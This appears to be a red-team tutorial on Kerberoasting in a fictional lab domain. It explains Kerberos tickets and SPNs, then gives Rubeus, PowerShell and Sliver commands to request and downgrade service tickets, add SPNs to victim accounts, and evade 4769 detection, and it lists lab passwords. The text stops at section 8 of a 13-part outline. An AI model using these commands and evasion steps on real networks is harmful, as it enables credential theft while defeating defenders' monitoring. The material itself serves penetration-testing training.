# KERBEROASTING: THE COMPLETE GUIDE
## From Zero Understanding to Cracking Service Account Passwords

> **Before we attack Kerberos, we need to DEEPLY understand it.**
>
> Many tutorials jump straight into commands. But if you don't understand:
> - What is the KDC? Is it software? A server? A protocol?
> - Where exactly does it live - on-premise or cloud?
> - What are "tickets" really? Like movie tickets?
> - What is an SPN? Why does it exist?
>
> ...then you'll just be running commands without understanding.
>
> **This guide explains EVERYTHING from absolute zero.**

---

# TABLE OF CONTENTS

**ABSOLUTE FUNDAMENTALS (NEW!)**
0. [The God-Level Explanation](#part-0-fundamentals) ⬅️ START HERE!

**FOUNDATIONAL KNOWLEDGE**
1. [Kerberos Protocol Internals](#part-1-kerberos-internals)
2. [Ticket Structure and Encryption](#part-2-ticket-structure)
3. [Service Principal Names Deep Dive](#part-3-spn-internals)
4. [Why Kerberoasting Works](#part-4-why-it-works)

**ADVERSARY TRADECRAFT**
5. [Target Selection and Prioritization](#part-5-target-selection)
6. [APT Kerberoasting Techniques](#part-6-apt-tradecraft)
7. [Evading Detection](#part-7-evasion)

**PRACTICAL EXECUTION**
8. [Lab Setup](#part-8-lab-setup)
9. [The Attack with Defender Bypass](#part-9-attack-execution)
10. [Cracking Methodology](#part-10-cracking)

**OPERATIONAL**
11. [Post-Exploitation](#part-11-post-exploitation)
12. [Interview Questions (15+)](#part-12-interview)
13. [Troubleshooting](#part-13-troubleshoot)

---

# PART 0: The God-Level Explanation of Kerberos {#part-0-fundamentals}

**Read this section carefully. Every concept is explained completely.**

---

## 0.1: What is Kerberos? (The Absolute Basics)

**Kerberos is an AUTHENTICATION PROTOCOL.**

Let me break that down:

- **Authentication** = Proving who you are (like showing your ID card)
- **Protocol** = A set of rules for communication (like a language)

So Kerberos is a set of rules that Windows computers use to prove who users and services are.

**Kerberos is NOT:**
- A server you can see or touch
- A cloud service
- A separate program you install
- Something from Microsoft Azure

**Kerberos IS:**
- A protocol (set of rules)
- Built into Windows since Windows 2000
- The DEFAULT authentication method in Active Directory
- Invented at MIT in 1988 (named after the 3-headed dog from Greek mythology)

---

## 0.2: What is the KDC? Where Does It Live?

**KDC = Key Distribution Center**

This is the most confusing part for beginners. Let me explain clearly:

**The KDC is a SERVICE that runs on the Domain Controller.**

```
VISUAL EXPLANATION:
────────────────────────────────────────────────────────────────

YOUR DOMAIN CONTROLLER (DC01):
┌─────────────────────────────────────────────────────────────┐
│                                                              │
│   WINDOWS SERVER 2019/2022                                  │
│   (This is a physical or virtual machine)                   │
│                                                              │
│   ┌───────────────────────────────────────────────────────┐ │
│   │                                                        │ │
│   │   ACTIVE DIRECTORY DOMAIN SERVICES (AD DS)            │ │
│   │   (This is a Windows "Role" you install)              │ │
│   │                                                        │ │
│   │   Inside AD DS, several SERVICES run:                 │ │
│   │                                                        │ │
│   │   ┌─────────────────────────────────────────────────┐ │ │
│   │   │                                                  │ │ │
│   │   │   KDC (Key Distribution Center)                 │ │ │
│   │   │   ─────────────────────────────                 │ │ │
│   │   │   This issues Kerberos tickets.                 │ │ │
│   │   │                                                  │ │ │
│   │   │   It has two parts:                             │ │ │
│   │   │   • AS (Authentication Service)                 │ │ │
│   │   │   • TGS (Ticket Granting Service)               │ │ │
│   │   │                                                  │ │ │
│   │   └─────────────────────────────────────────────────┘ │ │
│   │                                                        │ │
│   │   ┌─────────────────────────────────────────────────┐ │ │
│   │   │   LDAP Service (directory queries)               │ │ │
│   │   └─────────────────────────────────────────────────┘ │ │
│   │                                                        │ │
│   │   ┌─────────────────────────────────────────────────┐ │ │
│   │   │   DNS Service (name resolution)                  │ │ │
│   │   └─────────────────────────────────────────────────┘ │ │
│   │                                                        │ │
│   └───────────────────────────────────────────────────────┘ │
│                                                              │
│   ┌───────────────────────────────────────────────────────┐ │
│   │   NTDS.DIT (The AD Database)                          │ │
│   │   Contains: All users, passwords (hashed), groups     │ │
│   └───────────────────────────────────────────────────────┘ │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**Key Points:**
1. The KDC is SOFTWARE (a Windows service)
2. It runs on the Domain Controller
3. It is PART of Active Directory
4. Every Domain Controller runs a KDC
5. It listens on port 88 (TCP/UDP)

**The KDC is NOT in the cloud (unless your DC is in Azure/AWS).**

For on-premise Active Directory:
- KDC runs on your physical/virtual Domain Controller
- It's in your server room or data center

For Azure AD / Azure AD DS:
- Microsoft runs the KDC for you
- You don't manage it directly

---

## 0.3: What is a "Ticket"? (This is Critical to Understand)

**A ticket is a piece of encrypted data that proves your identity.**

Let me explain with a real-world comparison:

```
REAL WORLD: MOVIE TICKETS
────────────────────────────────────────────────────────────────

1. You go to the ticket counter (like the KDC)
2. You pay money (prove identity with password)
3. You get a MOVIE TICKET
4. You show the ticket to enter the theater
5. The ticket proves you paid - you don't pay again

KERBEROS: AUTHENTICATION TICKETS
────────────────────────────────────────────────────────────────

1. When you log in, your computer contacts the KDC
2. You prove identity (password hash)
3. KDC gives you a TICKET (encrypted data blob)
4. You show the ticket to access services (file shares, SQL, etc.)
5. The ticket proves who you are - no password needed again!
```

**Why Use Tickets Instead of Passwords?**

| Method | Security | Speed |
|--------|----------|-------|
| Send password every time | BAD - can be intercepted | Slow - verify each time |
| Send password hash | BAD - can be replayed | Slow |
| Use tickets | GOOD - encrypted, time-limited | Fast - no verification needed |

**What Does a Ticket Actually Look Like?**

A Kerberos ticket is a blob of ENCRYPTED data. You can't read it - only the intended recipient can decrypt it.

```
EXAMPLE TICKET (simplified):
────────────────────────────────────────────────────────────────

ENCRYPTED with service's password hash:
{
    "username": "vamsi.krishna",
    "domain": "ORSUBANK.LOCAL", 
    "groups": ["Domain Users", "IT_Team"],
    "valid_from": "2024-12-28 10:00:00",
    "valid_until": "2024-12-28 20:00:00",
    "session_key": "random-encryption-key-for-this-session"
}

ACTUAL APPEARANCE:
$krb5tgs$23$*svc_sql$ORSUBANK.LOCAL$MSSQLSvc/sql:1433*$a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0...

(This is just encrypted garbage to anyone who doesn't have the right key)
```

---

## 0.4: Types of Tickets - TGT vs TGS

**There are TWO types of tickets in Kerberos:**

| Ticket Type | Full Name | What It Does | Who Can Decrypt It |
|-------------|-----------|--------------|-------------------|
| **TGT** | Ticket Granting Ticket | Proves you logged in | Only the KDC (encrypted with krbtgt hash) |
| **TGS** | Ticket Granting Service | Proves you can access a specific service | Only that service (encrypted with service's hash) |

**The Flow:**

```
KERBEROS TICKET FLOW:
────────────────────────────────────────────────────────────────

STEP 1: Login - Get TGT
────────────────────────
You: "I'm vamsi, here's proof I know my password"
KDC: "OK, here's a TGT - it's valid for 10 hours"

The TGT is like a "day pass" to the domain.
You show it to get service tickets.

STEP 2: Access Service - Get TGS
────────────────────────────────
You: "I have this TGT, I want to access SQL server"
KDC: "OK, here's a TGS (service ticket) for SQL"

The TGS is like a "ticket for a specific ride".
You show it to the SQL server to get access.

STEP 3: Use the Service
───────────────────────
You: "SQL Server, here's my ticket"
SQL: "Let me decrypt this... yes, you're vamsi.krishna, access granted!"
```

---

## 0.5: What is an SPN? (Service Principal Name)

**SPN = The "address" of a Kerberos-enabled service**

When you want to access SQL Server, you need to tell the KDC WHICH SQL Server. The SPN is how you identify it.

**SPN Format:**
```
serviceclass/hostname:port

Examples:
─────────
MSSQLSvc/sql01.orsubank.local:1433     → SQL Server on sql01, port 1433
HTTP/web01.orsubank.local               → Web server on web01
CIFS/fileserver.orsubank.local          → File shares on fileserver
LDAP/dc01.orsubank.local                → LDAP on the domain controller
```

**Where are SPNs stored?**

SPNs are stored as an ATTRIBUTE on user or computer accounts in Active Directory.

```
ACTIVE DIRECTORY:
────────────────────────────────────────────────────────────────

USER: svc_sql
├── sAMAccountName: svc_sql
├── password: (hashed)
├── memberOf: SQL_Admins
└── servicePrincipalName: MSSQLSvc/sql01.orsubank.local:1433  ← SPN!

When KDC gets a request for "MSSQLSvc/sql01.orsubank.local:1433",
it looks up which account has that SPN, and uses THAT account's
password hash to encrypt the ticket.
```

**Why SPNs matter for Kerberoasting:**

1. We request a ticket for an SPN
2. KDC encrypts it with the service account's password hash
3. We get that encrypted ticket
4. We try to crack the password by guessing

---

## 0.6: The Kerberoasting Vulnerability - Simple Explanation

**Now you understand:**
- KDC = Service on Domain Controller that issues tickets
- Tickets = Encrypted blobs proving identity
- SPNs = Addresses of services

**The vulnerability:**

```
THE KERBEROASTING ATTACK - SIMPLE VERSION:
────────────────────────────────────────────────────────────────

1. ANY domain user can request a TGS for ANY SPN

   You don't need access to SQL to request a ticket for SQL.
   The KDC just gives it to you!
   
2. The TGS is encrypted with the SERVICE ACCOUNT's password

   The KDC uses the svc_sql account's password to encrypt it.
   
3. You now have an encrypted blob

   You can't read it, but you HAVE it.
   
4. You can try to CRACK this offline

   You try passwords: "Password123" - does it decrypt? No.
   You try: "SqlAdmin2019" - does it decrypt? YES!
   
   You found the password!
   
5. No lockout, unlimited attempts

   This is OFFLINE cracking. The KDC doesn't know.
   You can try billions of passwords.
```

**Why this is a huge problem:**

| Problem | Reality |
|---------|---------|
| Who can request tickets? | ANY domain user (even guests) |
| Detection? | Looks like normal Kerberos traffic |
| Lockout? | NONE - offline cracking |
| Password quality? | Service accounts often have weak passwords |
| Privileges? | Service accounts are often over-privileged |

---

## 0.7: On-Premise vs Cloud - Where Does This Apply?

**Kerberoasting applies to TRADITIONAL Active Directory:**

| Environment | Kerberoasting Possible? | Why |
|-------------|------------------------|-----|
| On-premise AD | YES | KDC runs on your DC |
| Azure AD only | NO | No KDC, uses OAuth/OIDC |
| Azure AD DS | YES | Microsoft runs KDC for you |
| Hybrid (AD + Azure) | YES (on AD side) | On-prem DC has KDC |
| AWS Managed AD | YES | AWS runs KDC for you |

**If your organization uses on-premise Active Directory (which most do), Kerberoasting is possible.**

---

## 0.8: Summary - Before Moving On

**Make sure you understand these before continuing:**

| Concept | What It Is |
|---------|-----------|
| **Kerberos** | Authentication PROTOCOL (set of rules) built into Windows |
| **KDC** | Service running on Domain Controller that issues tickets |
| **TGT** | "Day pass" proving you logged in (encrypted with krbtgt) |
| **TGS** | "Service ticket" for a specific service (encrypted with service password) |
| **SPN** | Address of a Kerberos service (like MSSQLSvc/sql01:1433) |
| **Kerberoasting** | Request TGS → Crack the service account password offline |

**If any of this is unclear, re-read this section. Everything else builds on this.**

---

# PART 1: Kerberos Protocol Internals {#part-1-kerberos-internals}

## 1.1: What is Kerberos Really Doing?

**Now that you understand the basics, let's go deeper.**

Kerberos is a **ticket-based authentication protocol**. The fundamental principle is:

> **You prove your identity ONCE (with your password), then use cryptographic tickets for all subsequent access.**

**Why this design?**
1. Your password never travels over the network (after initial auth)
2. Services can verify you without a central lookup each time
3. Access can be delegated to other services
4. Tickets have limited lifetime (security)

## 1.2: The Three Actors

```
KERBEROS ACTORS:
────────────────────────────────────────────────────────────────

CLIENT                      KDC (Key Distribution Center)         SERVICE
(User/Computer)             (The Domain Controller)               (SQL, HTTP, etc.)
                                     │
                            ┌────────┴────────┐
                            │                 │
                           AS                TGS
                   (Authentication     (Ticket Granting
                       Service)           Service)
```

**Key Distribution Center (KDC):**
The Domain Controller runs TWO services:
1. **AS (Authentication Service)** - Issues TGTs after password verification
2. **TGS (Ticket Granting Service)** - Issues service tickets when shown a valid TGT

## 1.3: The Complete Kerberos Flow

```
DETAILED KERBEROS AUTHENTICATION:
────────────────────────────────────────────────────────────────

CLIENT (vamsi.krishna)                    KDC (DC01)                         SERVICE (SQL)
         │                                     │                                   │
         │ ══════════════════════════════════════════════════════════════════════ │
         │                   PHASE 1: GET THE TGT                                  │
         │ ══════════════════════════════════════════════════════════════════════ │
         │                                     │                                   │
         │ 1. AS-REQ (Authentication Request)  │                                   │
         │    ─────────────────────────────────>                                   │
         │    Contains:                        │                                   │
         │    • Username                       │                                   │
         │    • Pre-auth (timestamp encrypted  │                                   │
         │      with user's password hash)     │                                   │
         │                                     │                                   │
         │                                     │ KDC validates:                    │
         │                                     │ • Decrypts timestamp with         │
         │                                     │   user's hash from NTDS.dit       │
         │                                     │ • Checks clock skew (±5 min)      │
         │                                     │                                   │
         │ 2. AS-REP (Authentication Response) │                                   │
         │    <─────────────────────────────────                                   │
         │    Contains:                        │                                   │
         │    • TGT (encrypted with KRBTGT)    │                                   │
         │    • Session key (enc with user's   │                                   │
         │      hash - user can decrypt)       │                                   │
         │                                     │                                   │
         │ ══════════════════════════════════════════════════════════════════════ │
         │                   PHASE 2: GET SERVICE TICKET                           │
         │ ══════════════════════════════════════════════════════════════════════ │
         │                                     │                                   │
         │ 3. TGS-REQ (Service Ticket Request) │                                   │
         │    ─────────────────────────────────>                                   │
         │    Contains:                        │                                   │
         │    • TGT                            │                                   │
         │    • Target SPN (MSSQLSvc/sql:1433) │                                   │
         │    • Authenticator (proves we have  │                                   │
         │      the session key from step 2)   │                                   │
         │                                     │                                   │
         │                                     │ KDC process:                      │
         │                                     │ 1. Decrypt TGT with KRBTGT        │
         │                                     │ 2. Find account with that SPN     │
         │                                     │ 3. Create TGS encrypted with      │ ←← THE VULNERABILITY
         │                                     │    SERVICE ACCOUNT's password     │
         │                                     │                                   │
         │ 4. TGS-REP (Service Ticket Response)│                                   │
         │    <─────────────────────────────────                                   │
         │    Contains:                        │                                   │
         │    • Service Ticket (TGS)           │                                   │
         │      (encrypted with svc_sql hash!) │ ←← WE CAN CRACK THIS!             │
         │    • Service session key            │                                   │
         │                                     │                                   │
         │ ══════════════════════════════════════════════════════════════════════ │
         │                   PHASE 3: ACCESS THE SERVICE                           │
         │ ══════════════════════════════════════════════════════════════════════ │
         │                                                                         │
         │ 5. AP-REQ (Application Request)     ─────────────────────────────────────>
         │    Contains:                                                            │
         │    • Service Ticket                                                     │
         │    • Authenticator (proves session key)                                 │
         │                                                                      │
         │                                     Service decrypts with its own hash  │
         │                                     Validates ticket, grants access     │
         │                                                                         │
         │ 6. AP-REP (Application Response)    <─────────────────────────────────────
         │    Access granted!                                                      │
```

## 1.4: The Vulnerability in Plain Terms

**The critical insight:**

> In step 4, the KDC encrypts the service ticket using the service account's password hash.
> 
> **The KDC gives this encrypted blob to us - the client.**
> 
> If we can GUESS the password that created this hash, we can decrypt the ticket.
> This is Kerberoasting.

**Why does the KDC do this?**

The service needs to verify the ticket, so it must be encrypted with something the service knows - its own password. This is by design, not a bug.

## 1.5: The Cryptographic Keys Involved

| Step | Key Used | Who Knows It |
|------|----------|--------------|
| AS-REQ pre-auth | User's password hash | User, KDC |
| TGT encryption | KRBTGT's hash | Only KDC |
| AS-REP session key | User's password hash | User, KDC |
| TGS (service ticket) | **Service account's hash** | Service, KDC |
| TGS-REP service session key | User's TGT session key | User, KDC |

**KRBTGT hash** = 128+ character random, rotates rarely → can't crack
**Service account hash** = Admin-chosen password → often weak → CAN CRACK!

---

# PART 2: Ticket Structure and Encryption {#part-2-ticket-structure}

## 2.1: Anatomy of a Kerberos Ticket

**A TGS ticket contains:**

```
TGS TICKET STRUCTURE:
────────────────────────────────────────────────────────────────

┌─────────────────────────────────────────────────────────────┐
│                    ENCRYPTED PORTION                         │
│              (Encrypted with service account hash)           │
├─────────────────────────────────────────────────────────────┤
│ • Session Key (for client-service communication)             │
│ • Client Principal Name (who this ticket is for)             │
│ • Client Realm (domain)                                      │
│ • Ticket Flags (forwardable, renewable, etc.)                │
│ • Auth Time (when user authenticated)                        │
│ • Start Time (when ticket becomes valid)                     │
│ • End Time (when ticket expires - typically 10 hours)        │
│ • Authorization Data (PAC - Privilege Attribute Cert)        │
│   └── User's SID                                             │
│   └── Group SIDs (what groups user is in)                    │
│   └── User account control flags                             │
└─────────────────────────────────────────────────────────────┘
```

**The PAC (Privilege Attribute Certificate) is critical:**
It contains the user's security context - their SID and all group memberships. When forging Golden Tickets, we can inject arbitrary groups (like Domain Admins).

## 2.2: Encryption Types (etypes)

**Kerberos supports multiple encryption algorithms:**

| Etype | Algorithm | Hash Mode | Crack Speed | Status |
|-------|-----------|-----------|-------------|--------|
| 23 | RC4-HMAC | 13100 | ~1M/sec GPU | Common, weak |
| 17 | AES128-CTS-HMAC-SHA1-96 | 19600 | ~100K/sec | Better |
| 18 | AES256-CTS-HMAC-SHA1-96 | 19700 | ~100K/sec | Best |
| 3 | DES-CBC-MD5 | - | Very fast | Deprecated |

**RC4 (etype 23) is 10x faster to crack than AES.**

**How encryption is negotiated:**
1. Client advertises supported etypes in TGS-REQ
2. KDC picks strongest etype supported by BOTH client and service account
3. If we only advertise RC4, we might get RC4 (if service supports it)

**Rubeus downgrade attack:**
```bash
Rubeus.exe kerberoast /tgtdeleg /enctype:rc4
```
This requests RC4 encryption even if AES is available.

## 2.3: The Hash Format

**When we extract a TGS, it looks like:**

```
$krb5tgs$23$*svc_sql$ORSUBANK.LOCAL$MSSQLSvc/sql.orsubank.local:1433*$a1b2c3d4e5f6...
```

**Breaking it down:**

| Component | Value | Meaning |
|-----------|-------|---------|
| `$krb5tgs$` | - | Kerberos 5 TGS hash identifier |
| `23` | etype | 23 = RC4-HMAC |
| `*svc_sql` | username | Service account name |
| `ORSUBANK.LOCAL` | realm | Domain name |
| `MSSQLSvc/sql...` | SPN | Service Principal Name |
| `$a1b2c3d4...` | encrypted data | The actual ticket data to crack |

**Hashcat modes:**
- 13100 = Kerberos 5 TGS-REP etype 23 (RC4)
- 19600 = Kerberos 5 TGS-REP etype 17 (AES128)
- 19700 = Kerberos 5 TGS-REP etype 18 (AES256)

## 2.4: How Cracking Works

**Hashcat's process:**

```
FOR each password in wordlist:
    1. Compute NTLM hash of password
    2. Use NTLM hash as RC4 key
    3. Attempt to decrypt the ticket data
    4. Check if decryption produces valid structure
    5. If valid → PASSWORD FOUND!
```

**Speed factors:**
- GPU power (RTX 3090 = ~2.5M hashes/sec for RC4)
- Wordlist quality
- Rule mutations
- AES is ~10x slower than RC4

---

# PART 3: Service Principal Names Deep Dive {#part-3-spn-internals}

## 3.1: What SPNs Really Are

**SPN = Service Principal Name = The "address" of a Kerberos service**

When a client wants to access a service, it needs to tell the KDC WHICH service. SPNs provide this mapping.

**SPN Format:**
```
serviceclass/hostname:port/servicename
```

**Real examples:**
```
MSSQLSvc/sql01.orsubank.local:1433           ← SQL Server
HTTP/web01.orsubank.local                     ← IIS / Web Server
CIFS/fileserver.orsubank.local                ← File Shares (SMB)
HOST/dc01.orsubank.local                      ← Computer Account
LDAP/dc01.orsubank.local                      ← LDAP Service
exchangeMDB/exchange01.orsubank.local         ← Exchange
WSMAN/server01.orsubank.local                 ← WinRM
TERMSRV/server01.orsubank.local               ← Remote Desktop
```

## 3.2: How SPNs Are Registered

**SPNs are stored in AD as attributes on accounts:**

```
ACCOUNT: svc_sql
ATTRIBUTE: servicePrincipalName
VALUE: MSSQLSvc/sql01.orsubank.local:1433
```

**Who can set SPNs?**
- Domain Admins (always)
- Account owner (for their own account)
- Users with `WriteSPN` permission on the account
- Service installation (SQL Server setup, etc.)

**Dangerous misconfiguration:**
If an attacker has `GenericAll` or `GenericWrite` on a user, they can ADD an SPN to that user → making them Kerberoastable (targeted Kerberoasting).

## 3.3: Computer Accounts vs User Accounts

| Account Type | SPN Example | Password | Kerberoastable? |
|--------------|-------------|----------|-----------------|
| Computer | HOST/WS01$ | 120+ char random, rotates | No (can't crack) |
| User (service) | MSSQLSvc/sql01 | Admin-set, maybe weak | **YES** |
| MSA | MSSQLSvc/sql01 | 240 char random, rotates | No |
| gMSA | MSSQLSvc/sql01 | 240 char random, rotates | No |

**Computer account passwords:**
```
Example: G&4#kL9@mN2$pQ5*rT8&uW1!xZ3#aB6...
Length: 120+ characters
Rotation: Every 30 days by default
```
These are impossible to crack. Don't waste time on computer SPNs.

## 3.4: Finding Accounts with SPNs

**LDAP Filter:**
```
(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))
```

**Translation:**
- `objectClass=user` - Users only
- `servicePrincipalName=*` - Has an SPN set
- `!(objectClass=computer)` - Exclude computer accounts

**PowerShell:**
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,PasswordLastSet,memberOf
```

**Via Sliver:**
```bash
sliver > execute -o powershell.exe -Command "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName | Select Name,ServicePrincipalName"
```

---

# PART 4: Why Kerberoasting Works {#part-4-why-it-works}

## 4.1: The Design "Flaw"

**Kerberoasting works because of a fundamental design decision:**

> The service must be able to decrypt the ticket to validate it.
> Therefore, the ticket MUST be encrypted with the service's own key.
> The service's key IS its password hash.

**This is not a bug - it's how Kerberos was designed in 1988.**

The assumption was:
- Service accounts would have STRONG passwords
- Offline password cracking would be computationally expensive

**Reality in 2024:**
- Service accounts often have weak passwords ("SqlAdmin123!")
- Modern GPUs crack millions of RC4 hashes per second
- Service accounts often have ancient, unchanged passwords

## 4.2: Why Admins Set Weak Passwords

**Service account password anti-patterns:**

```
svc_sql:       SqlAdmin2019           ← Year of installation
svc_backup:    Backup123!             ← Service name + numbers
svc_iis:       IIS@website            ← Obvious pattern
svc_exchange:  Exchange2024           ← Easy to remember
svc_print:     PrintService1          ← Generic
```

**Why this happens:**
1. "The application requires us to enter a password" - admin picks something easy
2. Password never expires (often required for services)
3. No one remembers to change it
4. "It's just a service account, not used for interactive login"
5. Fear of breaking production if password changes

## 4.3: Why Service Accounts Often Have High Privileges

**The privilege creep problem:**

```
INITIAL SETUP:
  svc_sql created with "just what SQL needs"

6 MONTHS LATER:
  "SQL can't access the share" → added to Server Operators

1 YEAR LATER:
  "Backups are failing" → added to Backup Operators

2 YEARS LATER:
  "New app needs SQL to write AD" → added to Domain Admins (!)

RESULT:
  svc_sql with password "SqlAdmin2019" is now Domain Admin
```

## 4.4: The Attack Economics

| Factor | Attacker Advantage |
|--------|-------------------|
| Cost to request ticket | Zero (any domain user can do it) |
| Detection risk | Low (normal Kerberos traffic) |
| Offline cracking | Unlimited attempts, no lockout |
| GPU cracking speed | Millions per second (RC4) |
| Service password quality | Often weak |
| Service account privileges | Often over-privileged |

**ROI for attackers is extremely high.**

---

# PART 5: Target Selection and Prioritization {#part-5-target-selection}

## 5.1: Not All Service Accounts Are Equal

**Prioritization matrix:**

| Criteria | Weight | How to Check |
|----------|--------|--------------|
| Group Memberships | ⭐⭐⭐⭐⭐ | BloodHound, memberOf attribute |
| Password Age | ⭐⭐⭐⭐ | pwdLastSet attribute |
| Encryption Type | ⭐⭐⭐ | msDS-SupportedEncryptionTypes |
| SPN Type | ⭐⭐ | SQL > Exchange > HTTP |
| Account Description | ⭐⭐ | Sometimes reveals purpose |

## 5.2: Using BloodHound for Target Selection

**Query: Kerberoastable users with path to DA**
```cypher
MATCH (u:User {hasspn: true})
MATCH p=shortestPath((u)-[:MemberOf*1..]->(g:Group {name: "DOMAIN ADMINS@ORSUBANK.LOCAL"}))
RETURN u.name, u.pwdlastset, length(p) as hops
ORDER BY hops
```

**Query: Kerberoastable users in high-value groups**
```cypher
MATCH (u:User {hasspn: true})-[:MemberOf*1..]->(g:Group)
WHERE g.highvalue = true
RETURN u.name, g.name
```

## 5.3: Checking Password Age

**Older password = more likely to be weak**

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,PasswordLastSet |
  Select Name, ServicePrincipalName, PasswordLastSet |
  Sort PasswordLastSet
```

**Output:**
```
Name          ServicePrincipalName               PasswordLastSet
----          --------------------               ---------------
svc_legacy    SVC/legacy.orsubank.local          3/15/2018 10:30 AM  ← 6 YEARS OLD!
svc_backup    backup/dc01.orsubank.local         1/10/2022 2:15 PM   ← 2 years old
svc_sql       MSSQLSvc/sql.orsubank.local:1433   11/20/2024 9:00 AM  ← Recent
```

**Target svc_legacy FIRST** - a 6-year-old password is likely weak and unchanged.

## 5.4: Checking Encryption Types

**RC4 is easier to crack. Check what's configured:**

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties msDS-SupportedEncryptionTypes,Name |
  Select Name, @{N='ETypes';E={$_."msDS-SupportedEncryptionTypes"}}
```

**Decoding msDS-SupportedEncryptionTypes:**
- 0 or not set = RC4 only (default, easiest)
- 24 = AES128 + AES256 (harder)
- 28 = RC4 + AES128 + AES256 (can request RC4)

---

# PART 6: APT Kerberoasting Techniques {#part-6-apt-tradecraft}

## 6.1: How APTs Approach Kerberoasting

**APT techniques differ from typical pentest tools:**

| Pentest Approach | APT Approach |
|-----------------|--------------|
| Request all SPNs at once | Request one SPN at a time |
| Use Rubeus with defaults | Custom tooling or living-off-land |
| Crack immediately | Store for later, prioritize targets |
| Ignore detection | Blend with normal traffic |

## 6.2: Targeted Kerberoasting

**Instead of requesting ALL tickets, request only high-value ones:**

```bash
# Bad (noisy) - requests all SPNs
Rubeus.exe kerberoast

# Good (targeted) - requests specific SPN
Rubeus.exe kerberoast /user:svc_backup
```

**Why targeted is better:**
1. Less network traffic
2. Fewer events logged
3. If svc_backup cracks, we don't need the others
4. Blends better with normal Kerberos activity

## 6.3: Using Native Windows Commands

**APT technique: Use built-in Windows APIs instead of bring-your-own-tools**

```powershell
# Request TGS using native .NET
Add-Type -AssemblyName System.IdentityModel
$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql.orsubank.local:1433"

# The ticket is now in memory
# Extract it with methods like Rubeus /tgtdeleg or klist
```

**LSA-based Kerberoasting:**
```powershell
# Request ticket and export from cache
klist get MSSQLSvc/sql.orsubank.local:1433
klist export /targetname:MSSQLSvc/sql.orsubank.local:1433
```

## 6.4: Adding SPNs for Targeted Kerberoasting

**If you have GenericAll or GenericWrite on a user:**

1. Add SPN to target user (makes them Kerberoastable)
2. Request TGS for that SPN
3. Crack the hash
4. Remove the SPN (cleanup)

```powershell
# Add SPN (via Sliver)
Set-ADUser -Identity target_user -ServicePrincipalName @{Add='HTTP/custom.orsubank.local'}

# Kerberoast
Rubeus.exe kerberoast /user:target_user

# Remove SPN
Set-ADUser -Identity target_user -ServicePrincipalName @{Remove='HTTP/custom.orsubank.local'}
```

---

# PART 7: Evading Detection {#part-7-evasion}

## 7.1: What Gets Logged

**Event ID 4769: A Kerberos service ticket was requested**

```
Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Event ID:      4769
Task Category: Kerberos Service Ticket Operations

Subject:
  Account Name:     vamsi.krishna
  Account Domain:   ORSUBANK

Service Information:
  Service Name:     MSSQLSvc/sql.orsubank.local:1433
  Service ID:       S-1-5-21-...-1103

Additional Information:
  Ticket Options:   0x40810000
  Ticket Encryption Type: 0x17 (RC4)
  Failure Code:     0x0
```

**Detection signatures look for:**
- Many 4769 events from one user in short time
- RC4 encryption requests (etype 0x17)
- Requests for rare/unusual SPNs
- Requests from non-server IPs

## 7.2: Evasion Techniques

**1. Time-based spacing:**
```bash
# Request one ticket, wait, request another
# Blends with normal traffic
Rubeus.exe kerberoast /user:svc_sql /delay:30000
```

**2. Request legitimate SPNs first:**
```bash
# Access file share first (normal)
net use \\fileserver\share
# Then Kerberoast (looks like normal usage pattern)
```

**3. Use AES when possible:**
```bash
# AES requests are less suspicious than RC4
Rubeus.exe kerberoast /enctype:aes256
```

**4. Execute from server, not workstation:**
If you have access to a server, Kerberos requests from servers are more normal than from workstations.

## 7.3: Defense Evasion Checklist

| Technique | Risk Reduction |
|-----------|----------------|
| Target specific users | Fewer events logged |
| Space requests over time | Avoids volume-based detection |
| Use AES encryption | Some signatures focus on RC4 |
| Execute from server | Server-origin traffic is expected |
| Use native Windows APIs | Avoid Rubeus signatures |
| Request during business hours | Blends with normal activity |

---

# PART 8: Lab Setup {#part-8-lab-setup}

## 8.1: ORSUBANK Kerberoastable Accounts

**These accounts were created by running the Enable-Kerberoasting.ps1 script on DC01:**

```
ORSUBANK KERBEROASTABLE SERVICE ACCOUNTS:
────────────────────────────────────────────────────────────────

┌────────────────┬──────────────────────────────────┬─────────────────┬──────────────────┐
│ Account        │ SPN                              │ Password        │ Group Membership │
├────────────────┼──────────────────────────────────┼─────────────────┼──────────────────┤
│ sqlservice     │ MSSQLSvc/DC01.orsubank.local:1433│ MYpassword123#  │ ServiceAccounts  │
│ httpservice    │ HTTP/web.orsubank.local          │ Summer2024!     │ ServiceAccounts  │
│ iisservice     │ HTTP/app.orsubank.local          │ P@ssw0rd        │ ServiceAccounts  │
│ backupservice  │ MSSQLSvc/DC01.orsubank.local:1434│ SQLAgent123!    │ ServiceAccounts  │
│ svc_backup     │ backup/dc01.orsubank.local       │ Backup@2024!    │ DOMAIN ADMINS!   │
└────────────────┴──────────────────────────────────┴─────────────────┴──────────────────┘

⚠️ HIGH VALUE TARGET: svc_backup is a member of Domain Admins!
   Cracking this = Complete domain compromise!
```

## 8.2: Running the Kerberoasting Script

**On DC01 (Domain Controller) - if not already run:**

```powershell
# Navigate to scripts
cd C:\Internal-RTO\lab-config\server

# Run the setup script
.\Enable-Kerberoasting.ps1

# Expected output:
# ╔══════════════════════════════════════════════════════════════════╗
# ║         ORSUBANK - ENABLE KERBEROASTING VULNERABILITY            ║
# ╚══════════════════════════════════════════════════════════════════╝
# [+] Created: sqlservice
#     Password: MYpassword123#
#     SPN: MSSQLSvc/DC01.orsubank.local:1433
# [+] Created: httpservice
# ...
```

## 8.3: Verifying Setup

```powershell
# Check SPNs were created
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,memberOf |
  Select Name, ServicePrincipalName, @{N='Groups';E={($_.memberOf | %{($_ -split ',')[0] -replace 'CN='}) -join '; '}}
```

**Expected output:**
```
Name            ServicePrincipalName                   Groups
----            --------------------                   ------
sqlservice      MSSQLSvc/DC01.orsubank.local:1433     ServiceAccounts
httpservice     HTTP/web.orsubank.local                ServiceAccounts
